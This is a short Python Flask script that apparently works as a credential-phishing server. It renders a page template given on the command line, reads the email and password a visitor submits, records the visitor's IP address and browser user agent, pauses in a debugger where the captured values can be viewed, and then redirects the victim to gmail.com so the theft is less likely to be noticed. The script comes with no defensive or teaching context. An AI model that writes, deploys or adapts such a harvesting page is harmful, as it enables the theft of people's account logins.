import sys
from flask import Flask, request, render_template, redirect

app = Flask(__name__)


@app.route('/', methods=['GET', 'POST'])
def hello_world():
    target = sys.argv[1]
    if request.method == 'POST':
        email = request.form['email']
        passwd = request.form['password']
        import ipdb; ipdb.set_trace()
        ip_addr = request.remote_addr
        user_agent = request.user_agent

        # redirect a donde toque
        return redirect("https://www.gmail.com", code=302)
    return render_template(target, name='index')

if __name__ == '__main__':
    app.run(debug=True,host='0.0.0.0')
    # app.run(host='0.0.0.0', port='80')
